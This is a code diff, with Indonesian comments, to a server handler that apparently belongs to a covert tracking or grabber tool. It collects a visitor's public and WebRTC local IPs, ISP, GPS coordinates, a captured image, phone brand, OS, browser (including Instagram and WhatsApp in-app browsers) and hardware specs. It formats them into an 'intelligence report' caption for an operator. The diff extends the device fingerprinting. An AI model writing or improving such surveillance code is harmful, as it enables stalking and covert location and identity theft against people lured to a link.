@@ -12,7 +12,7 @@ export default async function handler(req, res) {
     const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
     const ipAddress = rawIp.split(',')[0].trim();
     const userAgent = req.headers['user-agent'] || '';
-    const { latitude, longitude, accuracy, image, localIPs } = req.body;
+    const { latitude, longitude, accuracy, image, localIPs, deviceData } = req.body;
 
     // 1. Deteksi ISP & Lokasi berdasarkan IP Publik
     let ispInfo = 'Tidak diketahui';
@@ -27,7 +27,18 @@ export default async function handler(req, res) {
         ispInfo = 'Gagal memuat ISP';
     }
 
-    // 2. Deteksi OS Breakdown
+    // 2. Deteksi Merek & Tipe HP (Device Model)
+    let deviceModel = 'Perangkat Tidak Diketahui';
+    if (/iphone/i.test(userAgent)) deviceModel = 'Apple iPhone';
+    else if (/samsung/i.test(userAgent)) deviceModel = 'Samsung Galaxy';
+    else if (/xiaomi|mi|redmi|poco/i.test(userAgent)) deviceModel = 'Xiaomi / Redmi / Poco';
+    else if (/oppo/i.test(userAgent)) deviceModel = 'Oppo';
+    else if (/vivo/i.test(userAgent)) deviceModel = 'Vivo';
+    else if (/realme/i.test(userAgent)) deviceModel = 'Realme';
+    else if (/huawei|honor/i.test(userAgent)) deviceModel = 'Huawei / Honor';
+    else if (/windows/i.test(userAgent)) deviceModel = 'Windows PC / Laptop';
+    else if (/macintosh/i.test(userAgent)) deviceModel = 'MacBook / Mac';
+
     let os = 'Unknown OS';
     if (/android/i.test(userAgent)) os = 'Android';
     else if (/iphone|ipad|ipod/i.test(userAgent)) os = 'iOS (Apple)';
@@ -35,7 +46,6 @@ export default async function handler(req, res) {
     else if (/macintosh|mac os x/i.test(userAgent)) os = 'macOS';
     else if (/linux/i.test(userAgent)) os = 'Linux';
 
-    // 3. Deteksi Jenis Browser / Aplikasi
     let browser = 'Unknown Browser';
     if (/instagram/i.test(userAgent)) browser = 'Instagram In-App Browser';
     else if (/whatsapp/i.test(userAgent)) browser = 'WhatsApp In-App Browser';
@@ -47,14 +57,23 @@ export default async function handler(req, res) {
     else if (/firefox/i.test(userAgent)) browser = 'Mozilla Firefox';
 
     const ipListStr = localIPs && localIPs.length > 0 ? localIPs.join(', ') : 'Tidak terdeteksi';
+    
+    // Data spesifikasi HP tambahan
+    const d = deviceData || {};
+    const cpuCores = d.hardwareConcurrency || '-';
+    const ramSize = d.deviceMemory || '-';
+    const screenRes = d.screenResolution || '-';
+    const lang = d.language || '-';
 
     try {
-        const captionText = `🚨 **Laporan Intelijen Lengkap**\n\n` +
+        const captionText = `🚨 **Laporan Intelijen & Perangkat**\n\n` +
+                            `📱 **Merek HP:** ${deviceModel}\n` +
+                            `💻 **OS:** ${os} | **Browser:** ${browser}\n` +
+                            `⚡ **CPU Cores:** ${cpuCores} Inti | **Est. RAM:** ${ramSize}\n` +
+                            `📐 **Resolusi Layar:** ${screenRes} | **Bahasa:** ${lang}\n\n` +
                             `🌐 **Public IP:** ${ipAddress}\n` +
-                            `🏢 **Provider / ISP:** ${ispInfo}\n` +
-                            `💻 **WebRTC Local IP:** ${ipListStr}\n\n` +
-                            `📱 **Sistem Operasi (OS):** ${os}\n` +
-                            `🧭 **Jenis Browser / Aplikasi:** ${browser}\n\n` +
+                            `🏢 **ISP:** ${ispInfo}\n` +
+                            `💻 **Local IP:** ${ipListStr}\n\n` +
                             `📍 **Latitude:** ${latitude || 'N/A'}\n` +
                             `📍 **Longitude:** ${longitude || 'N/A'}\n` +
                             `🎯 **Akurasi GPS:** ${accuracy ? accuracy + ' meter' : '-'}\n` +
